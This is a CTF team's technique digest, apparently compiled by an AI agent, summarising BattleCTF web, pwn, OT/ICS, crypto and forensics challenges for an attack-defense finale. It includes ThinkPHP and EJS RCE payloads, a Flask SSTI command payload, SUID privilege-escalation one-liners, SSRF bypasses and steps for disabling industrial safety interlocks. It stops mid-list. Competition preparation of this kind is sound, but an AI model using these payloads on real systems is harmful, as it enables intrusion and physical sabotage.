# BattleCTF (bugpwn) → NCTF Finale Technique Digest

> Built 2026-11-13 for the team's NCTF finale prep.
> **Why this matters:** BattleCTF / "Africa battleCTF" is run by the **same org (bugpwn)**
> and targets the **same francophone-Africa scene** as NCTF, on the same infra family
> (`cert.ctf.bugpwn.com` / `ctf.bugpwn.com`). Its **2023 edition had an attack-defense FINAL**,
> which is the closest public analogue to the NCTF finale format (service patching + exploit loop).
>
> **Provenance / source repos** (all cloned read-only under
> `workspaces/nctf26-finale/discord-harvest/downloads/battlectf/`):
> every claim below cites an exact path inside one of these clones.
>
> **SECURITY NOTE:** all cloned material is untrusted CTF code. This digest was produced by
> **reading only** — no challenge, solver, Docker image, or binary was executed, built, or installed.

---

## Repos cloned vs failed

| # | Repo | Local dir | Status |
|---|------|-----------|--------|
| 1 | `0xbugpwn/battleCTF-2023` | `battleCTF-2023/` | **OK** — 2023 Prequal + **Final (A&D) sources** |
| 2 | `0xbugpwn/AfricabattleCTF2024` | `AfricabattleCTF2024/` | **OK** — 2024 Qualifier sources |
| 3 | `Legeek117/battlectf2026_writeups` | `battlectf2026_writeups/` | **OK** — 2026 Qualifier writeups |
| 4 | `DazBot13-boopt/ctf-writeups` | `DazBot13-ctf-writeups/` | **OK** — 2026 Qual: pwn/web/**OT-ICS**/vuln-research (richest) |
| 5 | `tinhatinh/Africa-battleCTF-2026-Qualifier` | `Africa-battleCTF-2026-Qualifier/` | **OK** — 2026 Qualifier writeups (flat `.md`) |
| 6 | `fr33k3v1n0/BattleCTF2k24` | `BattleCTF2k24/` | **OK** — 2k24 pwn writeups (poj ret2libc, universe seccomp) |
| 7 | `h4ckyou/h4ckyou.github.io` | `h4ckyou.github.io/` | **CLONED, but target absent** — full clone completed (HEAD `30be7dc`). The manifest's `posts/ctf/battlectf24/writeup.md` **does not exist** in this repo: it is a Jekyll blog (`_posts/`) and a case-insensitive grep for `battlectf`/`bugpwn` across all posts returns **nothing**. The file was never present (or removed from history). No battlectf content incorporated from this repo. See "Unfetched / pending". |
| — | `N0vachr0n0/Infinity-Stack` | — | **Skipped** per instructions (link list only). |

> Repos 3, 4 and 5 are three independent write-up sets of the **same 2026 Qualifier**, so they
> corroborate each other. DazBot13 (#4) is the most complete and is cited as the primary source.

---

# ATTACK-DEFENSE — the 2023 Final (TOP PRIORITY for the finale)

**Path:** `battleCTF-2023/Final/` — `README.md` just says "cd challenge; docker-compose up -d".

## Format decoded (maps directly to the finale)

Every Final service is a **boot2root-style Docker container** with a **two-layer** design that the
finale's "service patching + exploit loop" scoring rewards:

1. **A remote web/network vuln** → gives you code exec or file read as the web user (`www-data`).
   This is your **attack** against opponents and the thing you must **patch** on your own box.
2. **A local privilege escalation** (SUID/setcap/weak-password) → `www-data` → **root**, to read
   `/root/root.txt`. This is usually a *second* flag and a *second* patch surface.

Flags are seeded as files at known paths: `flag.txt` (web root / `/etc/flag...`), `user.txt`,
`root.txt` (seen across `Final/*/flag/` and `Final/*/Dockerfile`). On the finale, exfil the
**current round's** flag from these locations, submit, then patch the entry vector **without
breaking the SLA checker** (the service must keep serving its normal page).

### Per-service breakdown

| Service | Dir | Web entry vector | Local privesc to root |
|---------|-----|------------------|-----------------------|
| **Agossi** | `Final/Agossi/` | **ThinkPHP 5.0.20 RCE** (framework pulled in `Dockerfile`: `think/archive/v5.0.20`) | `Dockerfile`: `RUN chmod +s /bin/dash` → SUID dash → instant root |
| **Ayihun** | `Final/Ayihun/` | **ThinkPHP 5.0.23 RCE** (`v5.0.23` + `think-captcha` — the famous 5.0.23 `s=index/\think\app/invokefunction` RCE) | `Dockerfile`: `RUN chmod +s /usr/bin/python3` → `python3 -c 'import os;os.setuid(0);os.system("sh")'` |
| **Gankpe** | `Final/Gankpe/` | **Zip-upload → webshell** (`source/index.php` runs `unzip -j -n` on the uploaded archive into a web-served dir) | `setcap cap_setuid+ep` on `/home/ctf/syscall` (Dockerfile) + FTP creds `ctf:amenza` in `config.php` + user `ctf:amenza` |
| **Ablou** | `Final/Ablou/` | **Upload filter bypass** (`source/index.php` blocks **only** `['php']` extension → upload `.phtml`/`.phar`/`.pht`) | MySQL; bcrypt db creds in `source/config.php` |
| **Mama** | `Final/Mama/` | **Upload filter bypass** (`www/index.php` allows only `gif/png/jpg/jpeg` by extension, no content check → `shell.php.jpg`-style or `.phtml` depending on handler; `conf/docker-php.conf` sets `AddHandler application/x-httpd-php .php`) | `start.sh`: `chmod +s /usr/bin/file` (SUID file → GTFOBins read-as-root) **and** `echo "root:cracker" | chpasswd` (known root password) |
| **Katacle** | `Final/Katacle/` | **SSRF** (`ssrf/index.php` passes `$_GET['url']` straight to `curl_exec`, read-only container) → pivots to the internal **Flask SSTI** service (`cobalt/app.py`, `render_template_string` with user `capital`) and a 32-bit **ret2libc** binary (`cobalt/source.c` + solver `cobalt`→`sh.py`) | n/a across containers; chain is SSRF→internal services |
| **AfricaBeauty** | `Final/AfricaBeauty/` | **PIL `ImageMath.eval` code injection** (`pilcve/app.py` — classic CVE-2022-22817-style eval RCE, see below) + **leaked `.env`** (`pilcve/app/.env` ships `FLAG=...` and Laravel bcrypt creds) | `setcap cap_setuid+ep` on `/home/ctf/sms` (Dockerfile) — `sms.c` is a `gets`-free but **`read(0,buf,0x40)` into `char[0x10]`** overflow, compiled `-z execstack -fno-stack-protector -no-pie` → ret2shellcode; cap_setuid → root |

### Deep dive: the two patterns you will re-face in the finale

**(a) ThinkPHP 5.0.x RCE (Agossi/Ayihun, and 2024 "Hmmm").** Both 5.0.20 and 5.0.23 are the
publicly-exploited versions. Payloads:
- 5.0.23: `POST /index.php?s=captcha` body
  `_method=__construct&filter[]=system&method=get&get[]=id`
  or `GET /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`.
- 5.0.20: `GET /?s=index/\think\Request/input&filter[]=system&data=id`.
Source proof the version is deliberately pinned: `Final/Agossi/Dockerfile`,
`Final/Ayihun/Dockerfile`, `AfricabattleCTF2024/Qualifier/Web/Hmmm/Dockerfile`.
**Patch (finale):** pin `topthink/framework` to a patched 5.0.x (≥5.0.24) or drop a request-level
filter rejecting `s=` + `invokefunction`/`__construct`/`filter[]` — but the SLA checker only loads
`Index::index()`, so an aggressive WAF rule is safe to add.

**(b) PIL `ImageMath.eval` RCE (AfricaBeauty).** `pilcve/app.py` does
`ImageMath.eval(mode, r=r, g=g, b=b)` where `mode` is the user-controlled `?mode=` arg, with only a
naive `badlist = ["sleep","time","eval","complile","passwd"]` substring filter. `ImageMath.eval`
compiles arbitrary Python; the blacklist misses `__import__`, `os`, `system`, `exec`, `open`,
`globals`, etc. Exfil the `.env` `FLAG` or spawn exec.
**Patch:** replace `ImageMath.eval` with a fixed per-mode lookup (dict of allowed ops), or allowlist
the exact `modes` keys already in the file.

### A&D operational notes distilled from the Final design

- **Two flags per box** (`user.txt` + `root.txt`) → budget for both the web vector and the privesc.
- **Privesc is almost always a planted SUID/setcap or a hard-coded password**
  (`chmod +s /bin/dash`, `chmod +s /usr/bin/python3`, `chmod +s /usr/bin/file`, `setcap cap_setuid`,
  `root:cracker`, `ctf:amenza`). First recon move on any shell:
  `find / -perm -4000 -o -perm -2000 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/passwd` →
  **this is exactly what `ctf-file-hunter` automates; run it the moment a shell lands.**
- **Patch surface = Dockerfile + the one PHP/Python entry file.** You patch the *entry file*, not
  the framework, to keep the SLA page working. Keep a copy of the pristine page
  (e.g. `Final/*/source/home.html`) so your patch doesn't change the checker-visible response.
- Base64 red herrings exist: `Final/Katacle/ssrf/robots.txt` is reversed-base64 of a rickroll URL,
  not a flag — don't rabbit-hole on encoded strings in A&D.

---

# OT / ICS  (EXTRA ATTENTION — recurring NCTF-scene category)

Primary source: `DazBot13-ctf-writeups/ot/` (2026 Qualifier, author `k1lls3vr4q`), corroborated by
`battlectf2026_writeups/writeups/ot/` and `Africa-battleCTF-2026-Qualifier/OT00*.md`.
All five OT challenges share one meta-shape worth memorizing:

> **Client-first TCP service, no banner, persistent single connection, state is per-connection,
> and the flag only materializes WHILE a dangerous physical condition is actively sustained**
> (written into high registers / a "Flag" node once a "destroyed/ruptured" bit is set).

### OT#001 — Water Treatment — `ot/ot001.md` — Modbus/TCP (real)
- **Mechanism:** Setpoint register `r0` is range-clamped `0..200`, but the *measured-value*
  register `r1` is **not** validated. Only FC03/06/16 respond. State lives on one persistent TCP conn.
- **Exploit:** hold one connection; `FC06 write r1=11100` **in a loop** to sustain the over-concentration
  (the value ramps back toward `r0`, so re-write it); after ~8 s sustained, flag is written as ASCII
  (2 chars/16-bit reg) starting at register **100 (0x64)**; read with FC03.
- **Finale takeaway:** range checks on *setpoints* don't protect *measurement* registers. Always test
  state persistence on **one** connection; writing then reading on a new connection hides the bug.

### OT#002 — Breaker 52 — `ot/ot002-breaker52.md` — custom 5-byte binary protocol (Aurora attack)
- **Mechanism:** Generator tie-breaker with **no ANSI-25 synchro-check relay**. Fixed 5-byte requests
  `[opcode][arg0..3]`; **per-opcode fixed response framing** (`0x01`→11 bytes telemetry with two LE
  float32 phase angles + breaker bit; others→1 byte). Opcodes: `0x01` telem, `0x03` gen state
  (`02`=DESTROYED), `0x04` open, `0x05 01` close.
- **Exploit:** compute slip angle `Δ=(grid−gen) mod 360` (accumulates ~5°/s); wait for `|Δ−180|≤6°`
  and send close `05 01 00 00 00` → out-of-phase closure destroys generator (`0x03`→`02`), flag in stream.
- **Finale takeaway:** **exact per-opcode response framing** is the whole game — drain-on-timeout
  desyncs the byte stream and makes state look random. Test **both float endiannesses early**.
  This is the real **2007 INL Aurora Generator Test**; recognize "no synchro-check" = close at Δ≈180°.

### OT#003 — Furnace Portal — `ot/ot003-furnace-portal.md` — Web + SSRF (steelworks)
- **Mechanism:** 3-stage chain. (1) creds leaked in `GET /commissioning-notes.txt`
  (`operator / St33lW0rks!2024`); (2) **SSRF filter bypass** on `POST /ops/test-sensor` — blocklist is
  case-sensitive (`furnace` blocked, `FURNACE` allowed) and dotted-only (decimal IP
  `http://2887770626:4000/` bypasses `172.*`); (3) logic flaw: `POST /emergency_stop` **without**
  prior `POST /vent` → "vessel ruptured" → flag appears in `GET /status`.
- **Finale takeaway:** SSRF allowlists must normalize case **and** all IP encodings
  (decimal/hex/octal/IPv6-mapped). The decimal-IP trick (`int(ip)` form) is a go-to bypass.

### OT#004 — Chemical Reactor — `ot/ot004-chemical-reactor.md` — custom "OPC-UA-style" binary
- **Mechanism:** **Two different endiannesses stacked.** Transport = `[u32 BE length][payload]`;
  message layer = `[op:u8][len:u32 LE][payload]`. `0x01` handshake→session id; `0x03` read / `0x04`
  write take `<I H I>` = `(sid, ns, nid)`. The **SIS shares the same address space + session** as the
  process controller, so generic write reaches safety nodes.
- **Exploit:** write `TripEnable(2,2001)=False` and `PretripLatch(2,2008)=False` (disable SIS), then
  `HeaterPower(1,1001)=100.0` for sustained thermal runaway; poll string node `(2,2004)` for the flag
  **while `Tripped(2,2003)` stays 0** (flag only populated during live danger).
- **Finale takeaway:** for any exposed SIS/safety layer, ask "does it share the write channel/session
  with process tags?" If yes, the protection is a software convention, not isolation. Mixed-endianness
  framing (BE transport, LE messages) is a deliberate confusion trap.

### OT#007 — Centrifuge Resonance — `ot/ot007-centrifuge-resonance.md` — **real** Modbus/TCP
- **Mechanism:** Here the vibration interlock **actually works** — you must **bypass**, not exploit an
  absence. `Coil 1 = MAINTENANCE OVERRIDE` (unauthenticated) disables the interlock. Then widen the
  speed mismatch between rotors: `HR10=1500` fixed, ramp `HR11` 1500→3000→…→9000 → vibration (IR4)
  rises past the destructive threshold → `IR0 bit2 = DESTROYED` → flag ASCII in `IR5+`.
- **Finale takeaway:** unauthenticated **maintenance/override** coils are the real-world ICS backdoor.
  `FC06` may ACK writes it doesn't store — **verify by read-back**, prefer `FC16` for setpoints.

### Reusable OT client (hand-rolled, no pymodbus) — from OT#007 writeup
A minimal Modbus/TCP client over the MBAP header implementing FC `01/03/04/05/06/16` is given inline in
`ot/ot007-centrifuge-resonance.md`; OT#001 and OT#002 give equivalent raw-socket skeletons
(`struct.pack(">HHHB", tid, 0, len+1, 1)` MBAP + PDU). **Pre-stage these before the finale.**

---

# PWN

Sources: `DazBot13-ctf-writeups/pwn/` + `battlectf2026_writeups/writeups/pwn/` (2026),
`BattleCTF2k24/PWN/` (2024), `AfricabattleCTF2024/Qualifier/Pwn/` (2024 sources),
`battleCTF-2023/Final/AfricaBeauty/sms.c` & `/Katacle/cobalt/source.c` (2023 Final binaries).

### PWN#001 — Vault Terminal — `pwn/pwn001.md` — seccomp-defeated ret2libc, `environ` leak
- **Mechanism:** x86-64 non-PIE, Full RELRO, canary, NX, **seccomp blocks `execve`+`openat`**
  ("get a shell" is a deliberate red herring). Off-by-one: name read 73 bytes into a 72-byte buffer,
  overwriting the canary LSB; `printf("%s")` then leaks the 7 high canary bytes. Flag is in **`FLAG=`
  env var**, not a file.
- **Exploit:** ROP `puts(puts@GOT)` to leak libc (Debian glibc **2.42-13**), compute base, then build
  a **memory-read oracle** via `write(1, environ, 8)` → `write(1, *environ, N)` to walk `char **environ`
  and dump `FLAG=`. Remote binary differs from handout by **`+0x10`** on some offsets → must fingerprint.
- **Finale takeaway:** when `execve` is seccomp-blocked, **`write(1,addr,n)` is a sufficient flag-read
  primitive**; the `environ` symbol in libc is the under-used vector when the flag is in the env.
  Always fingerprint remote vs local (even +0x10 breaks the chain).

### PWN#002/003 — Notes / Notes Vault — `pwn/pwn002-notes.md`, `pwn/pwn003.md` — heap UAF
- **Mechanism:** custom allocator / glibc heap; use-after-free → **freelist/tcache poisoning** →
  overwrite a function pointer or GOT → ret2libc. (003 explicitly: UAF + freelist poisoning + ret2libc.)
- **Finale takeaway:** standard tcache-poisoning playbook; keep a tcache/fastbin dup template ready.

### PWN#004 — Pets — `pwn/pwn004-pets.md` — C++ vtable whitelist / heap
- **Mechanism:** C++ object with a vtable; a "whitelist" check on the virtual call is bypassable via
  heap grooming to control the vtable pointer.

### PWN#005 — Document Store — `pwn/pwn005.md` — **blind pwn** → ORW
- **Mechanism:** no binary provided; dump PIE/libc by leaking, then **open-read-write** the flag file
  (seccomp-friendly) instead of a shell. (Matches the agent's own MEMORY note on PWN#005 being
  blackbox-hard.)

### PWN#006 — QuickJS — `pwn/pwn006-quickjs.md` — JS engine TypedArray OOB
- **Mechanism:** TypedArray **bounds-check bypass** → arbitrary read → `environ` leak. Modern
  browser/JS-engine-style pwn; relevant if the finale ships a scripting-engine service.

### PWN#007 — Kernel Vault — `pwn/pwn007-kernel-vault.md` — Linux kernel UAF (`/dev/vault`)
- **Mechanism:** custom char driver in a QEMU VM (Linux 6.1.176, **SMEP on, SMAP off**). ioctl API
  CREATE/DELETE/READ/WRITE/NOTIFY/**LEAK** (LEAK copies `&vault_ioctl` to userspace → KASLR defeat).
  **DELETE doesn't NULL `slots[id]` after kfree → UAF.** Header is kmalloc-32 with an **XOR-obfuscated
  callback** (`^0x6f6f56e06f2d7f60`) invoked by NOTIFY → control it via UAF reclaim → ROP to `commit_creds`.
- **Finale takeaway:** kernel-pwn is in-scope for this org; the "LEAK ioctl defeats KASLR + UAF via
  missing NULL-after-free + obfuscated callback" trio is the template. SMAP-off means userland payload
  pointers are usable.

### Cross-arch "Vault" series — `pwn/pwn-delta.md`, `pwn/vault-alpha-beta.md`, `pwn/pwn-epsilon.md`, `pwn/pwn-zeta.md`
Same bug class (canary leak + ROP) ported to exotic ISAs — a BattleCTF signature:
- **Delta** PowerPC32: off-by-one canary leak + **`stwu` back-chain ROP**.
- **Alpha/Beta** ARM/Thumb & MIPS: canary leak + ROP.
- **Epsilon** RISC-V 64: canary leak + ROP syscall `execve` using compressed insns (`c.ldsp`/`addi16sp`).
- **Zeta** **CHERI purecap**: not a memory-safety bug — a **logic bug / scratch-credential escalation**
  (capabilities block the usual overflow).
- **Finale takeaway:** keep **cross-arch toolchains + qemu-user** staged (`qemu-ppc`, `qemu-mips`,
  `qemu-riscv64`); the bug is familiar, only the gadget-finding/ISA differs. Beta is flagged in the
  agent's MEMORY as remote-CFI-blocked — expect remote hardening.

### 2024 pwn (with source) — `AfricabattleCTF2024/Qualifier/Pwn/` and `BattleCTF2k24/PWN/`
- **poj** (`BattleCTF2k24/PWN/poj_writeup.md`, source `AfricabattleCTF2024/.../poj`): No canary +
  write-address leak; `read(0x100)` into `char[64]` → BOF, **offset 72**, ret2libc/ret2system.
- **universe / universe2** (`BattleCTF2k24/PWN/universe_write_up.md`): **seccomp**-gated (see
  `images/seccomp_dump.png`) → ORW shellcode rather than shell.
- **kami** (`AfricabattleCTF2024/.../kami/arm.c` + `ld-linux-aarch64`): **AArch64** pwn (cross-arch
  theme again).
- **2023 Final binaries:** `Katacle/cobalt/source.c` is a textbook 32-bit `gets()` ret2libc (leaks
  `system`, solver `sh.py` present); `AfricaBeauty/sms.c` is `read(0,buf,0x40)` into `char[0x10]` with
  `-z execstack -no-pie` → ret2shellcode.

---

# WEB

Sources: `DazBot13-ctf-writeups/web/` (2026, primary), `battleCTF-2023/Final/*` + `/Prequal/Web/*`
(2023 sources), `AfricabattleCTF2024/Qualifier/Web/*` (2024 sources).

### SwiftNotes — `web/swiftnotes.md` — Prototype pollution → EJS RCE (Node/Express)
- **Mechanism:** `POST /api/settings` does `merge(user.settings, req.body)` with a recursive merge that
  descends into `__proto__` → prototype pollution; render engine is **EJS `^3.1.0` (< 3.1.7, vulnerable)**
  with `view cache: false` (recompiles every render).
- **Exploit:** WAF blocks raw `__proto__` but matches the *raw* string → bypass with JSON `\uXXXX`
  escapes (`"__proto__"`, `"outputFunctionName"`). Pollute
  `outputFunctionName` (EJS < 3.1.7 gadget: `var <name> = __append;` injects verbatim) → RCE:
  `process.mainModule.require('child_process').execSync('cat /data/flag.txt')`, write result into
  `locals.settings.flag`. CVE-2022-29078.
- **Finale takeaway:** **string-matching WAFs are defeated by JSON `\uXXXX` escapes** (JSON.parse
  reconstructs the key). Prototype-pollution → EJS `outputFunctionName` is a reliable Node RCE combo.

### ClearHouse — `web/clearhouse.md` — IDOR GraphQL + path traversal + **js-yaml v3 RCE via `toJSON`**
- **Mechanism (3-step):** (1) **GraphQL field-level IDOR**: `createPayout(correctsPayoutId:"1")` then
  read `corrects { merchant { apiKey } }` — the *field* resolver lacks ownership checks even though the
  root query has them → leak the `ops-internal` apiKey. (2) **Path traversal**:
  `GET /ops/templates/download?name=...` uses `name.replace('../','')` which **removes only one
  occurrence** → `"../"*9 + /app/config/internal-secrets.json` leaks `reportCoreToken`. (3) **js-yaml v3
  RCE**: internal `report-core` does `JSON.stringify(yaml.load(body))`; a `!!js/function` blocklist is
  bypassed with the **verbatim tag form** `!<tag:yaml.org,2002:js/function>`, and since `JSON.stringify`
  calls `toJSON()`, a `toJSON:` function property executes during serialization → dump `process.env`
  (runs as root).
- **Finale takeaway (three separate reusable tricks):**
  - GraphQL ownership checks are often only on root queries — **always probe relation/field resolvers**.
  - `replace('../','')` = single-pass → defeat with stacked `../`.
  - **YAML tag blocklists are bypassed by the verbatim URI tag form**; `JSON.stringify` → `toJSON` is a
    free code-exec sink. js-yaml **v3 `yaml.load` is unsafe by default**.
  - Differentiated error strings ("invalid template" / "rejected: disallowed tag" / "internal error")
    map the server's code branches — use them as an oracle.

### TicketVault — `web/ticketvault.md` — NoSQL filter injection → broken access control (IDOR)
- **Mechanism:** `/tickets/search?filter=<JSON>` feeds a user-controlled Mongo query object to
  `db.find(filter)` after a weak "scope to current user" step. A top-level `owner` key gets overwritten
  by the forced scope, **but a top-level Mongo operator (`$or`) makes the scope drop entirely**:
  `filter={"$or":[{"owner":{"$exists":true}}]}` dumps all tickets (incl. `admin`).
- **Finale takeaway:** never pass a user-supplied query object to the DB driver; if you must, AND the
  ownership constraint non-bypassably (`{$and:[{owner:me}, sanitize(userFilter)]}`) and strip top-level
  `$`-keys. Beware **decoy "canary" tickets** with fake flags planted by other players — require
  `owner === "admin"` literally.

### EchoGate — `web/echogate.md` — HTTP request smuggling (CL.TE)
- **Mechanism:** `/api/echo` reflects the body; `/admin/flag` is "internal only" (gated on
  `X-Internal-Request` / `X-Forwarded-For` headers). Duplicate `Transfer-Encoding: chunked` +
  `Transfer-Encoding: x` → front-end uses Content-Length, back-end uses chunked → everything after the
  `0\r\n\r\n` terminator is smuggled as a new request carrying the attacker's own internal headers.
- **Finale takeaway:** **header-based "internal only" auth is defeated by smuggling your own headers.**
  Use **raw sockets** (HTTP libs normalize headers). The `time.sleep(15)` before sending matters for
  back-end connection reuse timing.

### WireVault — `web/wirevault.md` — cache-timing leak + non-atomic TOCTOU race
- **Mechanism:** `/api/admin/status` leaks an ops settlement code during a transient
  `X-Cache: HIT` window; the transfer "verify then record consumption" is **two non-atomic ops**, so one
  code is spent on **~60 synchronized concurrent requests** (last-byte release). Mixed-case paths bypass
  the **OpenResty rate-limiter key** while Express routes them to the same handler.
- **Finale takeaway:** race the gap between check and record (last-byte-sync / single-packet). **Path
  casing differences bypass proxy rate-limiters** that key on exact path — directly relevant because the
  2026 web services sit **behind OpenResty/nginx with per-IP rate limits** (see ClearHouse timing notes).

### 2023/2024 web building blocks (sources on disk)
- **Flask SSTI** — `Final/Katacle/cobalt/app.py` and `Prequal/Web/{Cobalt Injection,Cobalt injection 2}`:
  `render_template_string` with user input (`capital`) → `{{7*7}}` → `{{config}}` /
  `{{cycler.__init__.__globals__.os.popen('id').read()}}`. Recurring org favourite (named "Cobalt").
- **PHP upload filter bypasses** — `Final/Ablou` (blocks only `.php`), `Final/Mama` (extension-allowlist,
  no magic-byte check), `Final/Gankpe` (zip `unzip -j` → drop `.php` into web root). Standard `.phtml`
  / `.phar` / double-extension / zip-slip answers.
- **PHP SQLi** — `Prequal/Web/Perfect Timing/index.php`: raw string-concat
  `SELECT * ... WHERE username='$username' AND password='$password'` → `' OR '1'='1` / UNION; "timing"
  theme hints at blind/time-based too.
- **ThinkPHP RCE** — `AfricabattleCTF2024/Qualifier/Web/Hmmm` (5.0.20) — same as Agossi/Ayihun above.
- **Jenkins** — `AfricabattleCTF2024/Qualifier/Web/jenkins/init.groovy` seeds `admin:nomodule` with
  `FullControlOnceLoggedIn` → login → Script Console (Groovy) RCE → `cat /etc/flag.txt`. Keep the
  Groovy `"cmd".execute().text` one-liner ready.

---

# CRYPTO

Sources: `battleCTF-2023/Prequal/Crypto/*` (full source on disk). No crypto writeups exist in the 2026
repos (that edition's public writeups cover only web/pwn/OT/vuln-research/out-context).

| Challenge | Path | Mechanism | Technique |
|-----------|------|-----------|-----------|
| **ROCYOU** | `Crypto/ROCYOU/public/rocyou.py` | RSA, single small `n` (~512-bit) with `e=65537`, flag = plaintext | Factor `n` (factordb / yafu / CADO-NFS) → standard RSA decrypt. Name hints the primes relate to a wordlist (`rockyou`). |
| **own e** | `Crypto/own e/public/chall.py` | RSA with **attacker-chosen `e`** (3 queries), message embeds a secret; ciphertext digits are lightly obfuscated `(d+5)^i` | Chosen-`e` / small-`e` or related-message attack; recover `secret` to pass the invite check. Note the per-digit `(+5)^index` wrapper must be inverted first. |
| **SEA** | `Crypto/SEA/public/chall.py` | AES-**CFB** with **fixed IV + key**, unlimited encryption oracle, flag encrypted first | CFB keystream reuse: `C_flag ⊕ C_known` recovers `P_flag` byte-by-byte via chosen-plaintext (stream-cipher XOR malleability). |
| **Sahara** | `Crypto/Sahara/public/generate.py` | RSA **PKCS#1 v1.5** encryption, `pub.pem` + `flag.enc` given | If `e` small / `n` factorable → direct; otherwise a Bleichenbacher/padding-oracle angle if a decrypt oracle exists (env has `sh.py`). Start by factoring `pub.pem`'s `n`. |
| **Gooss** | `Crypto/Gooss/public/gooss.py` | Each flag char encoded by quartic poly `2a·x⁴+b·x³+c·x²+d·x+e` with fixed random coeffs | Known-plaintext: `battleCTF{` prefix gives enough (x, y) pairs to solve for `a..e` (5 unknowns) via linear algebra over the integers, then invert per char. Solver `solv.py` on disk. |
| **Blind** | `Crypto/Blind/Chall File/Chall_blind.txt` | (text-only, likely RSA blind-signature / LSB oracle) | Inspect `Synopsis.txt`; classic RSA blinding or parity-oracle. |
| **Back To Origin** | `Crypto/Back To Origin/Metaphysics.png` | stego/encoding in image | forensics-crypto crossover. |

**Finale takeaway:** the org's crypto favours **(a) factorable RSA moduli** (always factordb-first),
**(b) stream/CFB keystream reuse with an oracle**, and **(c) polynomial/known-plaintext encodings**.
Pre-stage `factordb` lookups, a CFB-XOR recovery snippet, and a linear-system solver (sympy/sage).

---

# REVERSE

Sources: `battleCTF-2023/Prequal/Reverse/*` (binaries + C/ASM source + some solvers on disk).
No dedicated reverse writeups in the 2026 repos.

- **babyrev** (`Reverse/babyrev/source/babyrev.c` + `solve.py`): simple check/keygen; solver provided —
  read it for the org's style of flag-check (char-by-char transform compared to a constant).
- **Mazui** (`Reverse/Mazui/source/Mazui.c`): standard crackme; static Ghidra + constant recovery.
- **infinity** (`Reverse/infinity/infinity.c`): logic/loop-based check.
- **Welcome / EWE / War** (`.asm` source present, e.g. `War/source/btl.asm`, `EWE/source/hello.asm`):
  hand-written assembly crackmes → trace the comparison loop.
- **Malware-themed RE** (notable org signature — real malware source reused as "reverse" challenges):
  `Reverse/EWE/source/Mirai.Linux.eragon.c` (**Mirai** variant), `Reverse/Seyi/source/Linux.RedMenshenBPFDoor.c`
  (**BPFdoor**). Expect challenges built from real Linux malware families; recognizing the family
  (BPFdoor's magic-packet trigger, Mirai's XOR'd config table `0xDEADBEEF`-style) shortcuts the solve.

**Finale takeaway:** expect C/ASM crackmes with a recoverable per-char transform, plus **malware-source-
derived** reverses — knowing BPFdoor / Mirai internals (config decryption, magic triggers) is a direct edge.

---

# FORENSICS

Sources: `battleCTF-2023/Prequal/Forensic/*` (challenge files on disk),
`DazBot13-ctf-writeups/out-context/operation-blackhole.md` (2026 network forensics).

- **Operation BLACKHOLE 1→8** (`out-context/operation-blackhole.md`): one shared `CTF1.pcapng`, 8
  DDoS-analysis questions answered entirely in **Wireshark/tshark**: Statistics→Endpoints/Conversations
  (attacker & target IP), `http.request && ip.src==<attacker>` (method, User-Agent, targeted port).
  **Takeaway:** keep a tshark cheat-sheet; one pcap often answers a whole question chain.
- **2023 Prequal Forensic** (files on disk): `Find Me/ChallFile/data.pcap`, `Suspect 95/Suspect95.pcap`
  (pcap credential/exfil extraction), `GIFt/gift.gif` (GIF frame/stego), `Minon`/`Africa Beauty`
  (JPEG EXIF/`binwalk`/appended-ZIP stego — the `.zip` siblings confirm appended-archive carving),
  `Blanche Neige/file.png` (PNG stego — `zsteg`/LSB), `Cybastion/restored.txt`, `Thumb/file.jpeg`
  (thumbnail-vs-image mismatch / `exiftool` embedded thumbnail).
- **2024 Forensic** (`AfricabattleCTF2024/Qualifier/Forensic/`): `Do[ro x2]/roro.ad1` (**AccessData AD1
  image** → mount with `ftkimager`/`Autopsy`), `Knock 5X/Knock 5X.pcapng` (**port-knock sequence** in a
  pcap → recover the knock ports), `Agent 47/Agent47`, `53cr37/password`, `Symphony/Note.txt`.

**Finale takeaway:** org forensics = **pcap (creds/port-knock/DDoS) + image stego (EXIF/appended-zip/LSP)
+ disk images (AD1)**. Stage `binwalk`, `zsteg`, `exiftool`, `foremost`, `tshark`, `ftkimager`.

---

# VULN RESEARCH (a distinct 2026 category — memory-safety CVE hunting)

Source: `DazBot13-ctf-writeups/vuln-research/` (7 challenges). These ship a real C library and you must
find/trigger a specific memory bug (ASAN-confirmed) — closer to fuzzing/source-audit than classic pwn.

| # | Path | Target | Bug |
|---|------|--------|-----|
| 001 | `vuln001-libexif.md` | libexif | OOB read in **MakerNote** parsing |
| 002 | `vuln002-dnsmasq.md` | dnsmasq | heap-buffer-overflow **read in DHCPv6 relay** |
| 003 | `vuln003-cares.md` | c-ares | OOB read in **CAA record** parser |
| 004 | `vuln004-ghostpixel.md` | giflib 5.2.2 | **double-free** in decode cleanup |
| 005 | `vuln005-goahead.md` | GoAhead ≤6.1.0 | **BF1 Basic-Auth bypass** (`websVerifyPasswordFromFile` compares the stored hash to itself) + config leak |
| 006 | `vuln006-freetype-bdf.md` | FreeType | heap OOB read via embedded **BDF** table |
| 007 | `vuln007-libarchive-7z.md` | libarchive 3.8.0 | heap OOB read in **7-Zip SFX/ELF** detection |

**Finale takeaway:** if the finale has a research/0-day-style track, the pattern is **"given lib + a
harness, craft a malformed input file that trips ASAN."** Stage AFL++/libFuzzer + ASAN builds. The
**GoAhead auth-bypass** (005) is also a live web/IoT technique: embedded server, `auth.txt` with a
`BF1:`-prefixed hash → the self-comparison bug lets Basic-Auth pass.

---

# OUT-OF-CONTEXT / OSINT / MISC

- `out-context/know-your-enemy.md` — OSINT on BUG|PWN's own public footprint.
- `out-context/discord.md` — flag hidden on the official Discord server (relevant: the finale ecosystem
  uses Discord; check pinned messages / channel topics / bot commands).
- `out-context/0byte.md` — meta/trivia flag.

---

# FINALE TOOLKIT CHECKLIST (concrete, pre-stage these)

**A&D box workflow (from the 2023 Final design):**
- [ ] On every shell: `find / -perm -4000 -o -perm -2000 2>/dev/null; getcap -r / 2>/dev/null; grep -R . /etc/passwd` → planted SUID/setcap/weak-pw is the privesc **every time** (dash/python3/file SUID, `cap_setuid`, `root:cracker`, `ctf:amenza`). **This is `ctf-file-hunter` — run it the instant a read primitive lands.**
- [ ] Grab both `user.txt` + `root.txt` (and `flag.txt` in web root / `/etc/flag*`); re-pull each scoring round.
- [ ] Patch the **entry file**, not the framework; diff against the pristine `home.html`/index so the SLA checker's response is unchanged.
- [ ] Keep a per-service exploit script that re-exfils the flag each round (flags rotate).

**Web payloads ready to paste:**
